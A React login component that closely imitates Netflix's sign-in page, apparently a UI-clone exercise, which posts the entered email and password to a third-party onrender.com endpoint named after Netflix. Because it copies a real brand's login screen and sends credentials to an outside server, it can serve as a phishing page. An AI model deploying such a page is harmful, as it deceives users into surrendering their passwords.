// LoginForm.jsx
import React, { useState } from 'react';
import axios from 'axios'
import { useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import { FaEye, FaEyeSlash } from 'react-icons/fa';


const LoginForm = () => {

const [user,setUser] = useState(
    {
        email:"",
        password:""
    }
)

const [passwordType , setPasswordType] = useState(false)

const navigate = useNavigate()

const handleUser = (key, value) => {
  setUser(prev => ({
    ...prev,
    [key]: value
  }));
};



const verifyData = ()=>{
  axios.post('https://netflix-login-scac.onrender.com/verify',{email:user.email, password:user.password})
    .then(res => {
   
    if (res.data === true) {
       toast.success("Login successful!");
      navigate('/home'); 
      
    }
    else {
        toast.error("Invalid email or password");
      }
    
  })

  .catch(err=>{

    console.log(err);
    
  })



}

const handleForm = (e)=>{
    e.preventDefault()
    verifyData()
    
}

const togglePassword = ()=>{
  setPasswordType(prev=>!prev)

}


  return (
    <div className="w-full max-w-md text-white p-10 flex flex-col gap-4 bg-black/75 rounded">
      <h1 className="text-3xl font-bold">Sign in</h1>
      <form action="" className="grid gap-5 w-full" onSubmit={handleForm} method='post'>
        <input
          type="text"
          onChange={(e)=>handleUser(e.target.name,e.target.value)}
          name='email'
          placeholder="Email or Mobile Number"
          required
          className="border border-gray-400 py-4 px-5 rounded bg-[#0F0F0F]/50 backdrop-blur-4xl text-gray-100 placeholder:text-gray-300 font-semibold"
        />
        <div className="relative w-full">
  <input
    type={passwordType ? "text" : "password"}
    onChange={(e) => handleUser(e.target.name, e.target.value)}
    name="password"
    placeholder="Password"
    required
    className="border border-gray-400 py-4 px-5 rounded bg-[#0F0F0F]/50 backdrop-blur-4xl text-gray-100 placeholder:text-gray-300 font-semibold w-full pr-12"
  />
  <span
    onClick={togglePassword}
    className="absolute top-1/2 right-4 transform -translate-y-1/2 text-gray-300 cursor-pointer text-lg"
    title={passwordType ? "Hide password" : "Show password"}
  >
    {passwordType ? <FaEyeSlash /> : <FaEye />}
  </span>
</div>
        <button  className="bg-red-600 font-bold text-white px-4 py-2 rounded text-md  cursor-pointer">
          Sign In
        </button>
        <p className="text-center">OR</p>
        <button type='button' className="bg-[#333333] font-bold text-white px-4 py-2 rounded text-md  cursor-pointer">
          Use a sign-in code
        </button>
        <a href="#" className="text-center underline">
          Forgot Password
        </a>
      </form>

      <p><input type="checkbox" />Rememeber Me</p>
      <p className='text-gray-300'>New to Netflix? <span className='text-white font-bold'>Sign up now.</span></p>
      <p className='text-gray-400 text-xs font-semibold'>This page is protected by Google reCAPTCHA to ensure you're not a bot.</p>
      <p className='text-blue-600 underline text-xs'>Learn more.</p>
    </div>
  );
};

export default LoginForm;
